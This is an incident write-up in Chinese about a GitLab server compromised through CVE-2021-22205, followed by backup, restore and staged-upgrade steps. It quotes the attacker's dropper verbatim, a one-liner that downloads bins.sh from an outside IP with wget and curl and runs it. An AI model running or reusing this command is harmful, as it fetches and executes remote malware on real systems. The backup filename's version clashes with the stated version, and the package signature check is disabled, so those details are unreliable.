问题描述与漏洞

年前朋友这边找到我，说自己公司的gitlab出现了问题，表现如下：

  • 带宽长期被占满，严重影响项目拉取速度

  • cpu动不动就到100%，代码无法拉取

这里发现有很多sh命令执行，而且重复性的内容很多，例如bins.sh这个文件，于是就在服务器全局搜索这个文件


# find / -name bins.sh
/var/opt/gitlab/gitlab-workhorse/bins.sh

发现文件指向了gitlab-workhorse目录。于是开始查找该目录下的文件信息：


# cd /var/opt/gitlab/gitlab-workhorse/ && ls
bins.sh  bins.sh.1  b.sh  b.sh.1  config.toml  gig.arm4  gig.arm5  gig.arm7  gig.mips  git.sh  git.sh.1  socket  VERSION  X86_64

随便打开一个文件查看：


cat bins.sh

sh -c TF=$(mktemp -u);mkfifo $TF && rm -rf bins.sh; wget http://23.94.138.109/bins.sh; curl -O http://23.94.138.109/bins.sh; chmod 777 bins.sh; sh bins.sh 0<$TF | sh 1>$TF

全部是sh开头的curl下载文件并执行的操作，和之前列出的进程信息类似。

初步反应是该部分有漏洞，被人上传了有问题的脚本，导致执行了shell脚本信息。

于是开始查找问题所在，通过google得知，gitlab低版本中存在的CVE漏洞，具体漏洞为：CVE-2021-22205，gitlab远程执行漏洞的问题。

根据CVE修复的指示，直接进行gitlab的版本升级即可。

升级前操作和备份

这里使用了域名进行gitlab的访问，而且gitlab是放在云服务器上。这里为了稳妥起见，先行购买7天的临时服务器进行迁移，迁移完成后再对该服务器做镜像，镜像完成后覆盖回原服务器。

在操作之前，先行进行gitlab的备份操作，如下：


# gitlab-rake gitlab:backup:create

备份完成后，会在/var/opt/gitlab/backups/目录下生成一个备份文件，以时间戳开头。现将这个文件拷贝出来，准备传入新的gitlab服务器上。

升级gitlab版本与验证

购买了新服务器后，先部署版本为11.10.6的gitlab服务，保证版本相同，记得上传已经备份好的gitlab备份文件。注意，只有版本相同，备份文件才能被恢复，否则无法进行操作。

恢复原gitlab的备份操作如下：

// 停机操作
# gitlab-ctl stop unicorn
# gitlab-ctl stop sidekiq
# gitlab-ctl stop nginx

// 拷贝已上传的备份文件
cp 1579400282_2020_01_19_12.2.5_gitlab_backup.tar /var/opt/gitlab/backups/

// 数据恢复操作 
# gitlab-rake gitlab:backup:restore BACKUP=1579400282_2020_01_19_12.2.5_gitlab_backup.tar

// 恢复完成后重启gitlab
# gitlab-ctl restart

这样原gitlab就已经正常恢复了。

根据官网的升级版本指示，升级版本路线为：

11.10.6 -> 11.11.8 -> 12.0.12 -> 12.1.17 -> 12.10.14 -> 13.0.14 -> 13.1.11 -> 13.8.8 -> 13.12.15

在执行升级之前，首先配置国内的镜像源，这里使用清华的gitlab源代理，首先进行yum源配置：


# vim /etc/yum.repos.d/gitlab-ce.repo

[gitlab-ce]
name=Gitlab CE Repository
baseurl=https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el7/
gpgcheck=0
enabled=1

// :wq保存退出

// 更新缓存信息
# sudo yum makecache

后续根据版本进行逐次安装，安装时注意：

  1. 升级时切记不能停机，不能执行gitlab-ctl stop。
  2. 升级完成后无需进行重启操作，在升级过程中已执行过gitlab-ctl restart，需要等待gitlab正常后，测试上传和拉取。
  3. 每次升级后务必进行登录操作，查看用户，项目等信息，是否有丢失的情况。
  4. 每次升级后务必进行上传拉取的测试，可以创建示例项目，进行服务测试。

升级过程如下：


# yum install gitlab-ce-11.11.8
# yum install gitlab-ce-12.0.12
# yum install gitlab-ce-12.1.17
# yum install gitlab-ce-12.10.14
# yum install gitlab-ce-13.0.14
# yum install gitlab-ce-13.1.11
# yum install gitlab-ce-13.8.8
# yum install gitlab-ce-13.12.15

升级完成后，根据漏洞复现，进行排查复现即可，无法复现漏洞，即为升级成功！
